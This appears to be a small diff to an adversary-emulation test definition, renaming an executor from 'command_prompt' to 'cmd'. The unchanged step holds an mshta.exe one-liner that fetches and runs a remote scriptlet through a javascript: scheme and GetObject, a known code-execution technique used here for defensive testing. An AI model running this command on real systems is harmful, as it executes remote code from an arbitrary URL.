@@ -21,4 +21,4 @@ steps:
     - name: mshta-executes-javascript-scheme-fetch-remote-payload-with-getobject
       inline: |
         mshta.exe javascript:a=(GetObject('script:{{.Args.file_url}}')).Exec();close();
-      executor: command_prompt
+      executor: cmd
